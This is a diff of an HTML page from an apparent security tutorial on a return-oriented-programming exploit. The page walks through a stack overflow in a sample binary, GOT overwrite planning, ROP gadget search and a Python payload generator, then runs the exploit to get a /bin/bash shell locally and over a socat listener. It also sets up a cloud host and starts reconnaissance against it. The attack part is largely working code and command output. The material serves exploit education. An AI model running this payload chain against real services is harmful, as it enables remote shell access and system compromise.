@@ -115,13 +115,36 @@
 <li class="toctree-l2"><a class="reference internal" href="shellcode.html">9.4. Shellcode</a></li>
 <li class="toctree-l2 current"><a class="current reference internal" href="#">9.5. ROP Example</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#kali-setup">9.5.1. Kali setup</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#the-vulnerable-program">9.5.2. The vulnerable program</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#planning-the-exploit-payload">9.5.2.1. Planning the exploit/payload</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#payload">9.5.2.2. Payload</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#libc-offsets">9.5.2.3. libc offsets</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#understanding-rop">9.5.2.4. Understanding ROP</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#finding-the-stack-overflow">9.5.2. Finding the stack overflow</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#finding-the-vulnerable-program">9.5.2.1. Finding the vulnerable program</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#analyze-the-program-s-assembly-code">9.5.2.2. Analyze the program’s assembly code</a></li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#planning-the-exploit-payload">9.5.3. Planning the exploit/payload</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#background-reading">9.5.3.1. Background reading</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#analyze-the-program-with-checksec">9.5.3.2. Analyze the program with <strong class="program">checksec</strong></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#the-outlines-of-rop-exploitation">9.5.3.3. The outlines of ROP exploitation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#collecting-libc-information">9.5.3.4. Collecting libc information</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#got-overwrite-planning">9.5.3.5. GOT overwrite planning</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#finding-rop-gadgets">9.5.3.6. Finding ROP gadgets</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#payload">9.5.4. Payload</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#generating-the-payload">9.5.4.1. Generating the payload</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#running-the-exploit-locally">9.5.4.2. Running the exploit locally</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#serving-the-exploit-over-localhost-8080">9.5.4.3. Serving the exploit over localhost:8080</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#libc-offsets">9.5.5. libc offsets</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#which-libc">9.5.5.1. Which libc?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vulnerable-host-in-gce">9.5.5.2. Setting up the vulnerable host in GCE</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#first-try-to-determine-the-os-version">9.5.5.3. First try to determine the OS/version</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#do-a-reconnaissance-exploit">9.5.5.4. Do a reconnaissance exploit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#major-libc-stats">9.5.5.5. Major libc stats</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#brute-force-vulnerable-server-search">9.5.5.6. Brute force vulnerable server search</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#understanding-rop">9.5.6. Understanding ROP</a></li>
 </ul>
 </li>
 </ul>
@@ -237,10 +260,12 @@ sudo apt install socat -y
 </pre></div>
 </div>
 </div>
-<div class="section" id="the-vulnerable-program">
-<h2>9.5.2. The vulnerable program<a class="headerlink" href="#the-vulnerable-program" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="finding-the-stack-overflow">
+<h2>9.5.2. Finding the stack overflow<a class="headerlink" href="#finding-the-stack-overflow" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="finding-the-vulnerable-program">
+<h3>9.5.2.1. Finding the vulnerable program<a class="headerlink" href="#finding-the-vulnerable-program" title="Permalink to this headline">¶</a></h3>
 <p>To study ROP we’re going to assume a vulnerable program <strong class="program">prog</strong> that conveniently enough:</p>
-<ul>
+<ol class="arabic">
 <li><p class="first">Your recon has revealed a base64 encoded copy (<a class="reference download internal" href="../_downloads/file" download=""><code class="xref download docutils literal"><span class="pre">file</span></code></a>) of the vulnerable program.</p>
 <p>Either the remote server admins are so incompetent as to allow access to a copy of their program, or it’s a well-known program you can obtain.</p>
 </li>
@@ -253,12 +278,7 @@ sudo apt install socat -y
 </pre></div>
 </div>
 </li>
-</ul>
-<p>So proceed with the exploit:</p>
-<ol class="arabic">
-<li><p class="first">Download the base64-encoded ELF <a class="reference download internal" href="../_downloads/file" download=""><code class="xref download docutils literal"><span class="pre">file</span></code></a>.</p>
-</li>
-<li><p class="first">Analyze it via:</p>
+<li><p class="first">Discover input 57 leads to unlimited buffer input:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># See its an ascii file, possibly base64 encoded</span>
 file file
 head file
@@ -274,7 +294,13 @@ chmod +x prog
 </pre></div>
 </div>
 </li>
-<li><p class="first">Analyze the program’s assembly code, looking for vulnerabilities. To get an assembly code listing:</p>
+</ol>
+</div>
+<div class="section" id="analyze-the-program-s-assembly-code">
+<h3>9.5.2.2. Analyze the program’s assembly code<a class="headerlink" href="#analyze-the-program-s-assembly-code" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="assembly-code-from-program-objdump">
+<h4>9.5.2.2.1. Assembly code from:program:<cite>objdump</cite><a class="headerlink" href="#assembly-code-from-program-objdump" title="Permalink to this headline">¶</a></h4>
+<p><strong class="program">objdump</strong> provides a complete listing of the ELF assembly:</p>
 <div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">objdump -M intel -s -S prog &gt; prog.txt</span>
 </pre></div>
 </div>
@@ -462,8 +488,10 @@ Disassembly of section .plt:
  8048581:	c3                   	ret    
 </pre></div>
 </div>
-</li>
-<li><p class="first">Let’s do a little address math. The answer to the program’s second question is stored starting at offset 0x107 (263 decimal) bytes into the stack. So the answer’s first 267 bytes clobbers the callee’s stack and the next 4 clobber the return address stored in the caller’s stack. So the stack looks like:</p>
+</div>
+<div class="section" id="finding-the-overflow">
+<h4>9.5.2.2.2. Finding the overflow<a class="headerlink" href="#finding-the-overflow" title="Permalink to this headline">¶</a></h4>
+<p>Let’s do a little address math. The answer to the program’s second question is stored starting at offset 0x107 (263 decimal) bytes into the stack. So the answer’s first 267 bytes clobbers the callee’s stack and the next 4 clobber the return address stored in the caller’s stack. So the stack looks like:</p>
 <img src="../_images/graphviz-6009fe085c547511e48565b6cf0c8f253329233c.png" alt="digraph S {
   node [ shape=record ]
   EBP
@@ -496,12 +524,13 @@ Almost there ... expand your horizons.
 </span><span class="hll">[13009.861072] prog[9225]: segfault at feedbeef ip 00000000feedbeef sp 00000000ffc9ead0 error 14
 </span></pre></div>
 </div>
-</li>
-</ol>
+</div>
+</div>
+</div>
 <div class="section" id="planning-the-exploit-payload">
-<h3>9.5.2.1. Planning the exploit/payload<a class="headerlink" href="#planning-the-exploit-payload" title="Permalink to this headline">¶</a></h3>
-<ol class="arabic">
-<li><p class="first">Background</p>
+<h2>9.5.3. Planning the exploit/payload<a class="headerlink" href="#planning-the-exploit-payload" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="background-reading">
+<h3>9.5.3.1. Background reading<a class="headerlink" href="#background-reading" title="Permalink to this headline">¶</a></h3>
 <p>You will need a basic understanding of executables and dynamic linking:</p>
 <blockquote>
 <div><p><a class="reference external" href="http://www.bottomupcs.com/">Computer Science from the Bottom Up</a> covers binary files (<a class="reference external" href="http://www.bottomupcs.com/chapter07.html">Chapter 8. Behind the process</a>) and the GOT table (<a class="reference external" href="http://www.bottomupcs.com/chapter08.html">Chapter 9. Dynamic Linking</a>).</p>
@@ -510,49 +539,48 @@ Almost there ... expand your horizons.
 <p><a class="reference external" href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html">Introduction to return oriented programming (ROP)</a></p>
 <p><a class="reference external" href="http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming">ROP (slides 31+)</a></p>
 </div></blockquote>
-</li>
-<li><p class="first">Do some reconnaissance to get an attack outline.</p>
+</div>
+<div class="section" id="analyze-the-program-with-checksec">
+<h3>9.5.3.2. Analyze the program with <strong class="program">checksec</strong><a class="headerlink" href="#analyze-the-program-with-checksec" title="Permalink to this headline">¶</a></h3>
 <p>Use <a class="reference external" href="https://github.com/slimm609/checksec.sh">checksec.sh</a> to analyze the binary for vulnerabilities:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>checksec --file prog
 </pre></div>
 </div>
 <p>Running the above results in:</p>
 <div class="highlight-text"><div class="highlight"><pre><span></span>hacker@kali:~$ checksec --file prog
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH        FORTIFY Fortified Fortifiable  FILE
-Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No        0               2       prog
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   FORTIFY Fortified Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No   0               2       prog
 </pre></div>
 </div>
 <p>Here’s the good news:</p>
 <blockquote>
 <div><dl class="docutils">
 <dt><a class="reference external" href="https://securityblog.redhat.com/2014/03/26/fortify-and-you/">FORTIFY_SOURCE</a></dt>
-<dd><p class="first last">This compiled in buffer overflow check is not enabled.</p>
-</dd>
+<dd>This compiled in buffer overflow check is not enabled.</dd>
 <dt><a class="reference external" href="http://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">STACK CANARY</a></dt>
-<dd><p class="first last">Not enabled allowing stack buffer overflows.</p>
-</dd>
+<dd>Not enabled allowing stack buffer overflows.</dd>
 <dt><a class="reference external" href="http://en.wikipedia.org/wiki/Position-independent_code">PIE</a></dt>
-<dd><p class="first last">Not enabled.</p>
-</dd>
+<dd>Not enabled.</dd>
 </dl>
 </div></blockquote>
 <p>Here’s the good/bad news:</p>
 <blockquote>
 <div><dl class="docutils">
 <dt>RELRO (<a class="reference external" href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT-PLT</a>)</dt>
-<dd><p class="first last">Partial RELRO, which allows GOT table overwrites.</p>
-</dd>
+<dd>Partial RELRO, which allows GOT table overwrites.</dd>
 </dl>
 </div></blockquote>
 <p>Here’s the bad news:</p>
 <blockquote>
 <div><dl class="docutils">
 <dt><a class="reference external" href="http://en.wikipedia.org/wiki/NX_bit">NX</a></dt>
-<dd><p class="first last">This forces us to use ROP.</p>
-</dd>
+<dd>This forces us to use ROP.</dd>
 </dl>
 </div></blockquote>
 <p>It is our good fortune to not have stack canaries, so the stack overflow should work. We’ll use <a class="reference external" href="http://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> (Return Oriented Programming) combined with GOT table overwrite to overcome <a class="reference external" href="http://en.wikipedia.org/wiki/NX_bit">NX</a> and <a class="reference external" href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> (Address Space Layout Randomization).</p>
+</div>
+<div class="section" id="the-outlines-of-rop-exploitation">
+<h3>9.5.3.3. The outlines of ROP exploitation<a class="headerlink" href="#the-outlines-of-rop-exploitation" title="Permalink to this headline">¶</a></h3>
 <p>So we’ll overwrite the GOT address for one of the <strong class="program">libc</strong> routines with the address of <strong class="command">execve</strong>. Let’s see what <strong class="program">libc</strong> routines we can exploit.</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>file prog
 <span class="c1"># Get the libc version used locally</span>
@@ -588,8 +616,9 @@ readelf --relocs prog
 </span></pre></div>
 </div>
 <p>The outline of a 2-stage attack is taking place: stage-0 will be what we call a “payload loader”: it’s job is to load the real payload (stage-1) into a fixed address in the .data elf section. Stage-0 has 2 steps: (1) use <code class="docutils literal"><span class="pre">scanf</span></code> to read stage-1 into .data section; (2) jump to the stage-1 payload via a <code class="docutils literal"><span class="pre">leave</span></code> instruction. Stage-1 will have 2 steps: (1) perform a GOT overwrite of the <code class="docutils literal"><span class="pre">puts</span></code> GOT entry to change it to <code class="docutils literal"><span class="pre">execve</span></code>; (2) call <code class="docutils literal"><span class="pre">execve</span></code> to change the program’s process to <code class="docutils literal"><span class="pre">/bin/bash</span></code>. You’ll see that some of these simple tasks are made harder by the fact that we cannot execute arbitrary instructions: we are reduced to using a highly limited selection of “gadgets” (little sections of code followed by a <code class="docutils literal"><span class="pre">ret</span></code> instruction). That makes some of the payload look a little tortuous.</p>
-</li>
-<li><p class="first">We need some information to carry out this attack:</p>
+</div>
+<div class="section" id="collecting-libc-information">
+<h3>9.5.3.4. Collecting libc information<a class="headerlink" href="#collecting-libc-information" title="Permalink to this headline">¶</a></h3>
 <p>The attack will call <strong class="program">libc</strong> routines <code class="docutils literal"><span class="pre">scanf</span></code> and <code class="docutils literal"><span class="pre">puts</span></code>. <code class="docutils literal"><span class="pre">scanf</span></code> will be used to input the attack, while <code class="docutils literal"><span class="pre">puts</span></code>’s GOT entry will be overwritten with the address of <code class="docutils literal"><span class="pre">execve</span></code> so a call to <code class="docutils literal"><span class="pre">puts</span></code> will open up a shell. To exploit these routines we need their PLT addresses. Here we determine they are <code class="docutils literal"><span class="pre">scanf</span></code> = 0x080483bc and <code class="docutils literal"><span class="pre">puts</span></code> = 0x080483cc by simply running <code class="docutils literal"><span class="pre">objdump</span> <span class="pre">-S</span> <span class="pre">-j</span> <span class="pre">.plt</span> <span class="pre">prog</span> <span class="pre">|</span> <span class="pre">egrep</span> <span class="pre">'(scanf&#64;plt|puts&#64;plt)'</span></code>:</p>
 <div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> We can use scanf and puts
 <span class="gp">hacker@kali:~$ #</span>   so get their calling address.
@@ -607,8 +636,9 @@ readelf --relocs prog
 </div>
 <p>We won’t be actually calling <code class="docutils literal"><span class="pre">puts</span></code>. Instead we’ll be using a technique called GOT overwrite to replace the address of <code class="docutils literal"><span class="pre">puts</span></code> with that of <code class="docutils literal"><span class="pre">execve</span></code> so that when <code class="docutils literal"><span class="pre">puts</span></code> is called, <code class="docutils literal"><span class="pre">execve</span></code> will actually be called.</p>
 <p>But before we discuss GOT overwrite let’s take care of <code class="docutils literal"><span class="pre">execve</span></code>’s calling arguments. The first argument will be the string “/bin/bash” and will be will be read as part of stage-1 by the <code class="docutils literal"><span class="pre">scanf</span></code> call in stage-0. The other two arguments will be NULL pointers and a quick scan of the .rodata section shows it ending with a NULL at address 0x8048709.</p>
-</li>
-<li><p class="first">GOT Overwrite Depends on the Host’s <strong class="program">libc</strong></p>
+</div>
+<div class="section" id="got-overwrite-planning">
+<h3>9.5.3.5. GOT overwrite planning<a class="headerlink" href="#got-overwrite-planning" title="Permalink to this headline">¶</a></h3>
 <p>The whole idea of GOT overwrite is to change the GOT pointer from one routine (<code class="docutils literal"><span class="pre">puts</span></code>) that you don’t need to use, to another (<code class="docutils literal"><span class="pre">execve</span></code>) that you would like to use. The difficulty is that with <a class="reference external" href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> you don’t know <code class="docutils literal"><span class="pre">execve</span></code>’s address until the program is loaded, which your pre-load exploit code can’t know. However, for any given <strong class="program">libc</strong> version, you do know the difference between <code class="docutils literal"><span class="pre">puts</span></code>’s address and <code class="docutils literal"><span class="pre">execve</span></code>’s address.</p>
 <blockquote>
 <div><p><code class="docutils literal"><span class="pre">puts</span></code> = <strong class="program">libc</strong> start + offset(<code class="docutils literal"><span class="pre">puts</span></code>)</p>
@@ -616,8 +646,7 @@ readelf --relocs prog
 </div></blockquote>
 <p>So we can compute</p>
 <blockquote>
-<div><p><code class="docutils literal"><span class="pre">execve</span></code> = <code class="docutils literal"><span class="pre">puts</span></code> + offset(<code class="docutils literal"><span class="pre">execve</span></code>) - offset(<code class="docutils literal"><span class="pre">puts</span></code>)</p>
-</div></blockquote>
+<div><code class="docutils literal"><span class="pre">execve</span></code> = <code class="docutils literal"><span class="pre">puts</span></code> + offset(<code class="docutils literal"><span class="pre">execve</span></code>) - offset(<code class="docutils literal"><span class="pre">puts</span></code>)</div></blockquote>
 <p>The only catch is that the offset difference offset(<code class="docutils literal"><span class="pre">execve</span></code>) - offset(<code class="docutils literal"><span class="pre">puts</span></code>) varies with the <strong class="program">libc</strong> version (seemingly increasing over time as code is added to libc). To avoid resorting to a brute-force attack, we’d have to know the target system’s <strong class="program">libc</strong>. For now we’ll ignore this difficultly and focus on getting the attack to work locally where we do know the offsets.</p>
 <p>We’ll need to overwrite <code class="docutils literal"><span class="pre">puts</span></code>’s GOT entry with the address of <code class="docutils literal"><span class="pre">execve</span></code>. The <code class="docutils literal"><span class="pre">puts</span></code> GOT table entry is ( <code class="docutils literal"><span class="pre">__libc_start_main</span></code> + offset(<code class="docutils literal"><span class="pre">puts</span></code>)). To change it to <code class="docutils literal"><span class="pre">execve</span></code>’s GOT table entry we just need to (1) locate <code class="docutils literal"><span class="pre">puts</span></code>’s GOT table address, then (2) add(offset(<code class="docutils literal"><span class="pre">execve</span></code>) - offset(<code class="docutils literal"><span class="pre">puts</span></code>)) to <code class="docutils literal"><span class="pre">puts</span></code>’s GOT entry to have <code class="docutils literal"><span class="pre">execve</span></code> called instead.</p>
 <p>So we determine <code class="docutils literal"><span class="pre">puts</span></code>’s GOT table entry address = 0804a014 two ways. The simplest way is using a <code class="docutils literal"><span class="pre">readelf</span></code> 1-liner. But we also show how using  <code class="docutils literal"><span class="pre">gdb</span></code> because it illustrates going from the PLT entry to the GOT entry, plus shows how to get the current actual address for <code class="docutils literal"><span class="pre">puts</span></code>. Note that both the GOT table entry and using <code class="docutils literal"><span class="pre">gdb</span></code>’s <code class="docutils literal"><span class="pre">print</span> <span class="pre">puts</span></code> command agree that for this particular run <code class="docutils literal"><span class="pre">puts</span></code> was loaded at 0xf7e3b160. Note this shows that the system lacks <a class="reference external" href="http://en.wikipedia.org/wiki/Return-to-libc_attack#Protection_from_return-to-libc_attacks">ASCII armoring</a> as the address of <code class="docutils literal"><span class="pre">puts</span></code> = 0xf7e3b160 doesn’t have leading whitespace.</p>
@@ -674,9 +703,9 @@ Almost there ... expand your horizons.
 &gt; Not enough ... you must really try more before your success.
 
 Breakpoint 1, 0x0804851e in main ()
-<span class="hll">   0x804856f &lt;play+79&gt;:   call   0x80483cc &lt;puts@plt&gt;
-</span><span class="hll">   0x80483cc &lt;puts@plt&gt;:  jmp    *0x804a014
-</span><span class="hll">0x804a014 &lt;puts@got.plt&gt;: 0xf7e3b160
+<span class="hll">   0x804856f &lt;play+79&gt;:      call   0x80483cc &lt;puts@plt&gt;
+</span><span class="hll">   0x80483cc &lt;puts@plt&gt;:     jmp    *0x804a014
+</span><span class="hll">0x804a014 &lt;puts@got.plt&gt;:    0xf7e3b160
 </span><span class="hll">$1 = {&lt;text variable, no debug info&gt;} 0xf7e3b160 &lt;puts&gt;
 </span>Kill the program being debugged? (y or n) [answered Y; input not from terminal]
 </pre></div>
@@ -708,8 +737,10 @@ Breakpoint 1, 0x0804851e in main ()
 <span class="go">0x56cc0</span>
 </pre></div>
 </div>
-</li>
-<li><p class="first">We need some ROP gadgets (code snippets ending in <code class="docutils literal"><span class="pre">ret</span></code>) to carry out the required computations. Why gadgets? Remember that anywhere you can input data is writable but not executable memory. So you can’t input instructions, only addresses of instructions and the input arguments needed (if any). And since you place the instructions linearly in the same memory, those instruction addresses must be to code sections that actually return to your exploit list, hence ROP = return-oriented programming. What returns? Well, existing <strong class="program">libc</strong> routines like <code class="docutils literal"><span class="pre">scanf</span></code> for one. That part of the exploit is known as return-to-libc. And addresses of instructions that happen to sit a little before a return instruction: those little code sections are called ROP gadgets. But it’s not easy locating those gadgets, hence we use <a class="reference external" href="https://github.com/packz/ropeme">ropeme</a> for locating gadgets to use in a ROP exploit.</p>
+</div>
+<div class="section" id="finding-rop-gadgets">
+<h3>9.5.3.6. Finding ROP gadgets<a class="headerlink" href="#finding-rop-gadgets" title="Permalink to this headline">¶</a></h3>
+<p>We need some ROP gadgets (code snippets ending in <code class="docutils literal"><span class="pre">ret</span></code>) to carry out the required computations. Why gadgets? Remember that anywhere you can input data is writable but not executable memory. So you can’t input instructions, only addresses of instructions and the input arguments needed (if any). And since you place the instructions linearly in the same memory, those instruction addresses must be to code sections that actually return to your exploit list, hence ROP = return-oriented programming. What returns? Well, existing <strong class="program">libc</strong> routines like <code class="docutils literal"><span class="pre">scanf</span></code> for one. That part of the exploit is known as return-to-libc. And addresses of instructions that happen to sit a little before a return instruction: those little code sections are called ROP gadgets. But it’s not easy locating those gadgets, hence we use <a class="reference external" href="https://github.com/packz/ropeme">ropeme</a> for locating gadgets to use in a ROP exploit.</p>
 <p>We break the exploit into 2 stages for one very important reason. The buffer overflow writes on the stack, and the stack’s address varies with each run. If we need to use a gadget with a <code class="docutils literal"><span class="pre">leave</span></code> instruction we’ll need to set ebp to the address to return in the stack. Also, we may want to call a couple of routines each of which need pointers to the addresses of arguments. If those arguments sit in the stack as part of the first buffer overflow, we don’t know their addresses. If, however, our first (stage-0) buffer overflow merely sets up a second (stage-1) buffer into into a known, fixed part of memory we can easily pass arguments as we know the addresses within that buffer.</p>
 <p>stage-0 consists of a call to <code class="docutils literal"><span class="pre">scanf</span></code> which has 2 arguments so we need a gadget to <code class="docutils literal"><span class="pre">pop</span></code> 2 items off the stack. We also need a leave statement to set the esp stack pointer to the stage-1 buffer location. We choose the first of each of these</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Now use ropeme</span>
@@ -777,13 +808,13 @@ search pop ebp
 </pre></div>
 </div>
 <p>The <code class="docutils literal"><span class="pre">leave</span></code> instruction means we have to set ebp to keep executing in our stage-1 buffer.</p>
-</li>
-</ol>
+</div>
 </div>
 <div class="section" id="payload">
-<h3>9.5.2.2. Payload<a class="headerlink" href="#payload" title="Permalink to this headline">¶</a></h3>
-<ol class="arabic">
-<li><p class="first">Here is the actual exploit, which must vary between local <strong class="program">libc</strong>’s due to the offsets changing in <strong class="program">libc</strong> between different versions. It overcomes NX, ASLR and ASCII-Armor mapping. The technique uses ROP, ret-to-libc to bypass NX, and resolves <strong class="program">libc</strong> address at runtime to bypass ASLR.</p>
+<h2>9.5.4. Payload<a class="headerlink" href="#payload" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="generating-the-payload">
+<h3>9.5.4.1. Generating the payload<a class="headerlink" href="#generating-the-payload" title="Permalink to this headline">¶</a></h3>
+<p>Here is the actual exploit, which must vary between local <strong class="program">libc</strong>’s due to the offsets changing in <strong class="program">libc</strong> between different versions. It overcomes NX, ASLR and ASCII-Armor mapping. The technique uses ROP, ret-to-libc to bypass NX, and resolves <strong class="program">libc</strong> address at runtime to bypass ASLR.</p>
 <p>The stage-0 loader transfers the actual stage-1 payload to the custom stack using <code class="docutils literal"><span class="pre">scanf</span></code> and ROP gadgets. The stage-0 loader is constructed to reuse data bytes in the vulnerable program to generate the payload. At the end of stage-0 we switch the stack frame to our custom stack in the .data segment and execute the actual stage-1 payload from there. The actual payload (stage-1) executes ROP gadgets to set up the final <code class="docutils literal"><span class="pre">execve</span></code> call.</p>
 <p>This is the python program that creates the exploit code, it’s one input being <code class="docutils literal"><span class="pre">offset(execve)</span> <span class="pre">-</span> <span class="pre">offset(puts)</span></code> computed by the <code class="docutils literal"><span class="pre">libc-offset.sh</span></code> script provided in the previous section. Download <a class="reference download internal" href="../_downloads/create-payload.py" download=""><code class="xref download docutils literal"><span class="pre">create-payload.py</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">create-payload.py</span></code>):</p>
 <div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
@@ -915,8 +946,10 @@ search pop ebp
 <span class="nb">exit</span><span class="p">()</span>
 </pre></div>
 </div>
-</li>
-<li><p class="first">Here is the first of 2 examples of running the exploit on your local host. First you can save the python program’s output to a file, then <code class="docutils literal"><span class="pre">cat</span> <span class="pre">FILE</span> <span class="pre">-</span> <span class="pre">|</span> <span class="pre">./prog</span></code> to run the exploit. We show here 3 code blocks to be cut-&amp;-pasted into a terminal window. The first kicks off the exploit which moves from a terminal with a prompt to a prompt-less subshell:</p>
+</div>
+<div class="section" id="running-the-exploit-locally">
+<h3>9.5.4.2. Running the exploit locally<a class="headerlink" href="#running-the-exploit-locally" title="Permalink to this headline">¶</a></h3>
+<p>Here is the first of 2 examples of running the exploit on your local host. First you can save the python program’s output to a file, then <code class="docutils literal"><span class="pre">cat</span> <span class="pre">FILE</span> <span class="pre">-</span> <span class="pre">|</span> <span class="pre">./prog</span></code> to run the exploit. We show here 3 code blocks to be cut-&amp;-pasted into a terminal window. The first kicks off the exploit which moves from a terminal with a prompt to a prompt-less subshell:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Create the input file using scripts provided</span>
 ./create-payload.py <span class="k">$(</span>./libc-offset.sh ./prog execve puts<span class="k">)</span> &gt; input
 
@@ -998,8 +1031,10 @@ ps -ef <span class="p">|</span> grep bash
 <span class="go">(rop) hacker@kali:~$</span>
 </pre></div>
 </div>
-</li>
-<li><p class="first">Here is the second of 2 examples of running the exploit on your local host, this time over the network. The target “server” is set up in one terminal window using <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-u</span> <span class="pre">nobody</span> <span class="pre">socat</span> <span class="pre">tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork</span> <span class="pre">exec:./prog</span></code>, running <code class="docutils literal"><span class="pre">prog</span></code> on port 8080. The second client terminal window connects to the server via <code class="docutils literal"><span class="pre">cat</span> <span class="pre">input</span> <span class="pre">-</span> <span class="pre">|</span> <span class="pre">socat</span> <span class="pre">-</span> <span class="pre">tcp4:127.0.0.1:8080</span></code>. The final exploit on a target server will work similarly to this exploit, the only differences being the IP address used and the different offsets within their libc (more on that later).</p>
+</div>
+<div class="section" id="serving-the-exploit-over-localhost-8080">
+<h3>9.5.4.3. Serving the exploit over localhost:8080<a class="headerlink" href="#serving-the-exploit-over-localhost-8080" title="Permalink to this headline">¶</a></h3>
+<p>Here is the second of 2 examples of running the exploit on your local host, this time over the network. The target “server” is set up in one terminal window using <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-u</span> <span class="pre">nobody</span> <span class="pre">socat</span> <span class="pre">tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork</span> <span class="pre">exec:./prog</span></code>, running <code class="docutils literal"><span class="pre">prog</span></code> on port 8080. The second client terminal window connects to the server via <code class="docutils literal"><span class="pre">cat</span> <span class="pre">input</span> <span class="pre">-</span> <span class="pre">|</span> <span class="pre">socat</span> <span class="pre">-</span> <span class="pre">tcp4:127.0.0.1:8080</span></code>. The final exploit on a target server will work similarly to this exploit, the only differences being the IP address used and the different offsets within their libc (more on that later).</p>
 <p>We start setting up the server in terminal window 1:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Do this from a different terminal window.</span>
 <span class="c1"># Mimick the target server</span>
@@ -1044,11 +1079,12 @@ id
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-</li>
-</ol>
+</div>
 </div>
 <div class="section" id="libc-offsets">
-<h3>9.5.2.3. libc offsets<a class="headerlink" href="#libc-offsets" title="Permalink to this headline">¶</a></h3>
+<h2>9.5.5. libc offsets<a class="headerlink" href="#libc-offsets" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="which-libc">
+<h3>9.5.5.1. Which libc?<a class="headerlink" href="#which-libc" title="Permalink to this headline">¶</a></h3>
 <p>What has been shown? When we know the libc offsets we can generate an exploit and get a shell. While they are known for a localhost, knowing them for a remote server is another thing.</p>
 <p>libc offsets can change with every patch and differ even more between Linux distributions. Attacking a remote server running the vulnerable program involves these steps:</p>
 <ol class="arabic simple">
@@ -1059,8 +1095,9 @@ id
 </li>
 <li>Once a likely range of libc offsets is determined, write a bash script to loop through a range of possible libc offsets until success.</li>
 </ol>
+</div>
 <div class="section" id="setting-up-the-vulnerable-host-in-gce">
-<h4>9.5.2.3.1. Setting up the vulnerable host in GCE<a class="headerlink" href="#setting-up-the-vulnerable-host-in-gce" title="Permalink to this headline">¶</a></h4>
+<h3>9.5.5.2. Setting up the vulnerable host in GCE<a class="headerlink" href="#setting-up-the-vulnerable-host-in-gce" title="Permalink to this headline">¶</a></h3>
 <p>To understand how to attack the vulnerable app, first set up the server on a cloud VM. In this case we’ll do it using Google Compute Engine and Debian 9.</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># SSH to the instance</span>
 ssh -i ~/.ssh/id_gce_jim.maki hacker@meetup.bitbender.org
@@ -1111,7 +1148,7 @@ id
 <p>Of course the vulnerable server is not accessible to determine the offset 0x51dd0. How might this be overcome?</p>
 </div>
 <div class="section" id="first-try-to-determine-the-os-version">
-<h4>9.5.2.3.2. First try to determine the OS/version<a class="headerlink" href="#first-try-to-determine-the-os-version" title="Permalink to this headline">¶</a></h4>
+<h3>9.5.5.3. First try to determine the OS/version<a class="headerlink" href="#first-try-to-determine-the-os-version" title="Permalink to this headline">¶</a></h3>
 <p>If you know the OS and version you can get an estimate of the offset. There are a number of ways a pentester might proceed.</p>
 <p>One way is to use DNS to finds out who owns the IP:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">whois <span class="k">$(</span>dig +short meetup.bitbender.org<span class="k">)</span>
@@ -1120,10 +1157,11 @@ id
